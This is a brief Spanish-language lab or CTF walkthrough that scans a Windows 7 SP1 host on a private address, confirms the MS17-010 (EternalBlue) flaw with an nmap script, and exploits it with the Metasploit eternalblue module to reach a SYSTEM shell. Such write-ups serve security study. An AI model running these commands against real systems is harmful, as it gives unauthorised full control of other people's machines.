PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5357/tcp  open  wsdapi

-Hacemos un escaneo de puertos en profundidad y nos encontramos la siguiente versión de Windows en el protocolo SMB:
	Windows 7 Enterprise 7601 Service Pack 1

-Todo apunta a que estamos ante un **EternalBlue**, lo comprobamos:
	nmap -p 445 --script=smb-vuln-ms17-010 192.168.1.143
		State: VULNERABLE
	     IDs:  CVE:CVE-2017-0143
		Efedtivamente, estamos ante un EternalBlue

-Abrimos Metasploit y lo explotamos:
	-Módulo a utilizar --> exploit/windows/smb/ms17_010_eternalblue
		-set rhosts 192.168.1.143
		-run
			meterpreter > shell
			C:\Windows\system32>whoami
			nt authority\system